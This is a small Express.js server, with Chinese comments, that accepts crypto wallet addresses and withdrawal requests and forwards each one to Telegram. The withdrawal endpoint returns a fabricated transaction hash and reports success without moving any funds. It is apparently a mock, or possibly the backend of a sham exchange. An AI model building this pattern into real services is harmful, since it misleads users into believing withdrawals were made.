// server.js
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { sendNotification } = require('./bot');

const app = express();
const PORT = process.env.PORT || 3000;

// 中间件
app.use(cors());
app.use(bodyParser.json());

// 模拟数据库
let walletAddress = null;

// 确认钱包地址
app.post('/api/wallet', async (req, res) => {
    const { wallet } = req.body;
    if (!wallet) return res.status(400).json({ success: false, error: 'Wallet is required' });

    walletAddress = wallet;

    // 立即通知 Telegram
    try {
        await sendNotification(`✅ 新钱包地址确认:\n${wallet}`);
        res.json({ success: true, wallet });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, error: 'Telegram send failed' });
    }
});

// 提现请求
app.post('/api/withdraw', async (req, res) => {
    const { coin, amount, wallet } = req.body;
    if (!coin || !amount || !wallet) return res.status(400).json({ success: false, error: 'Missing fields' });

    const txHash = 'TX-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2,8);

    // 发送到 Telegram
    try {
        await sendNotification(`💰 提现请求:\n币种: ${coin}\n数量: ${amount}\n钱包: ${wallet}\nTX Hash: ${txHash}`);
        res.json({ success: true, hash: txHash });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, error: 'Telegram send failed' });
    }
});

// 启动
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
